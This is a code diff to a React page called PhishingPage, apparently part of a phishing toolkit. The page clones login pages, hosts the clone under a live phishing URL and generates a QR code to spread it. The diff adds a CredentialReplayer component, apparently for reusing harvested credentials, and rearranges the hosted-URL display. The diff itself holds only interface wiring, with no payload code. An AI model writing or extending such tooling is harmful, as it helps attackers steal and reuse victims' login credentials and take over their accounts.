@@ -23,6 +23,7 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@
 import { Dialog, DialogTrigger, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
 import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
 import { Separator } from '@/components/ui/separator';
+import { CredentialReplayer } from '@/components/credential-replayer';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -422,23 +423,22 @@ export default function PhishingPage() {
             </Card>
           
           {hostedUrl && (
-             <Card>
-               <CardHeader>
-                 <CardTitle>Hosted Page URL</CardTitle>
-                 <CardDescription>Your phishing page is live. Use the URL or QR code below.</CardDescription>
-               </CardHeader>
-               <CardContent className="space-y-4">
-                 <div className="flex w-full items-center gap-2">
-                   <Input readOnly value={hostedUrl} className="font-mono" />
-                   <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
-                     <Clipboard className="h-4 w-4" />
-                   </Button>
-                 </div>
-                 <div className="flex justify-center">
-                   <QrCodeGenerator url={hostedUrl} />
-                 </div>
-               </CardContent>
-             </Card>
+             <div className="grid md:grid-cols-2 gap-4">
+                <Card>
+                    <CardHeader>
+                        <CardTitle>Hosted Page URL</CardTitle>
+                    </CardHeader>
+                    <CardContent>
+                        <div className="flex w-full items-center gap-2">
+                            <Input readOnly value={hostedUrl} className="font-mono" />
+                            <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
+                                <Clipboard className="h-4 w-4" />
+                            </Button>
+                        </div>
+                    </CardContent>
+                </Card>
+                <QrCodeGenerator url={hostedUrl} />
+             </div>
            )}
 
             <Card>
@@ -485,7 +485,8 @@ export default function PhishingPage() {
       </div>
       
       <Separator className="my-8" />
-      
+      <CredentialReplayer />
+      <Separator className="my-8" />
       <AdvancedPageCloner />
     </div>
   );
